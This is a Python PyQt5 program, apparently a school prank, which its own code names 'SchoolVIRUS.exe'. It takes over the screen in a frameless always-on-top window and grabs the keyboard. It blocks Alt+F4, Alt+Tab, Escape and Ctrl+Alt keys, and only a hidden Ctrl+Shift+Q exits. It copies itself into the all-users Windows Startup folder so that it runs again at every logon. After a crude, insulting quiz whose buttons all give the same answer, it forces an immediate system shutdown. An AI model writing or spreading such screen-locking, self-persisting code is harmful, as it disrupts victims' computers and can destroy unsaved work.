import sys
import time
import os
import shutil
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QVBoxLayout
from PyQt5.QtGui import QFontDatabase, QFont
from PyQt5.QtCore import Qt, QTimer

class ShutdownQuiz(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Shutdown Quiz")
        self.setStyleSheet("background-color: black;")
        
        # Полноэкранный режим и поверх всех окон
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
        self.showFullScreen()

        # Перехватываем клавиатуру
        self.grabKeyboard()

        # Копируем себя в автозагрузку для всех пользователей
        self.setup_autostart()

        # Определяем путь к шрифту
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.dirname(__file__)
        
        font_path = os.path.join(base_path, "Unquiet Spirit.otf")

        # Загрузка кастомного шрифта
        font_id = QFontDatabase.addApplicationFont(font_path)
        font_families = QFontDatabase.applicationFontFamilies(font_id)
        if font_families:
            self.custom_font = QFont(font_families[0], 30)
        else:
            self.custom_font = QFont("Arial", 30)

        self.layout = QVBoxLayout()
        self.label = QLabel("Нажми, чтобы начать")
        self.label.setFont(QFont(self.custom_font.family(), 50))
        self.label.setStyleSheet("color: red;")
        self.label.setAlignment(Qt.AlignCenter)
        self.layout.addWidget(self.label)

        self.start_button = QPushButton("НАЧАТЬ")
        self.start_button.setFont(QFont(self.custom_font.family(), 40))
        self.start_button.setStyleSheet("color: red; background-color: black; border: 2px solid red;")
        self.start_button.clicked.connect(self.start_quiz)
        self.layout.addWidget(self.start_button)

        self.setLayout(self.layout)

    def setup_autostart(self):
        if getattr(sys, 'frozen', False):
            exe_path = sys.argv[0]
        else:
            return  # Не делаем автозапуск в режиме .py

        # Путь к автозагрузке для всех пользователей
        startup_path = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
        virus_name = "SchoolVIRUS.exe"
        target_path = os.path.join(startup_path, virus_name)

        if not os.path.exists(target_path):
            try:
                shutil.copy2(exe_path, target_path)
            except Exception:
                pass  # Если нет прав, пропускаем

    def start_quiz(self):
        self.start_button.hide()
        self.next_question("СОСАЛ?", ["Да", "Да"], self.question_2)

    def next_question(self, question_text, answers, next_function):
        self.label.setText(question_text)
        for i in reversed(range(self.layout.count())):
            widget = self.layout.itemAt(i).widget()
            if widget and widget != self.label:
                widget.setParent(None)
        for answer in answers:
            button = QPushButton(answer)
            button.setFont(self.custom_font)
            button.setStyleSheet("color: red; background-color: black; border: 2px solid red;")
            button.clicked.connect(next_function)
            self.layout.addWidget(button)

    def question_2(self):
        self.next_question("Скачивал когда-либо вирусы?", ["Да", "Да"], self.question_3)

    def question_3(self):
        self.next_question("Любишь школу?", ["Нет", "Нет"], self.countdown_and_shutdown)

    def countdown_and_shutdown(self):
        self.label.setText("Самоуничтожение через 3...")
        QTimer.singleShot(1000, lambda: self.label.setText("Самоуничтожение через 2..."))
        QTimer.singleShot(2000, lambda: self.label.setText("Самоуничтожение через 1..."))
        QTimer.singleShot(3000, self.shutdown)

    def shutdown(self):
        os.system("shutdown /s /t 1")

    def keyPressEvent(self, event):
        # Секретный выход: Ctrl+Shift+Q
        if (event.modifiers() & Qt.ControlModifier and 
            event.modifiers() & Qt.ShiftModifier and 
            event.key() == Qt.Key_Q):
            # Удаляем из автозагрузки перед выходом
            startup_path = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
            target_path = os.path.join(startup_path, "SchoolVIRUS.exe")
            try:
                if os.path.exists(target_path):
                    os.remove(target_path)
            except Exception:
                pass
            # Отменяем shutdown, если он запущен
            os.system("shutdown /a")
            self.close()  # Закрываем приложение
        # Блокируем остальное
        elif event.key() == Qt.Key_F4 and (event.modifiers() & Qt.AltModifier):
            event.ignore()
        elif event.key() == Qt.Key_Tab and (event.modifiers() & Qt.AltModifier):
            event.ignore()
        elif event.key() == Qt.Key_Escape:
            event.ignore()
        elif event.modifiers() & Qt.ControlModifier and event.modifiers() & Qt.AltModifier:
            event.ignore()
        else:
            super().keyPressEvent(event)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ShutdownQuiz()
    window.show()
    sys.exit(app.exec_())
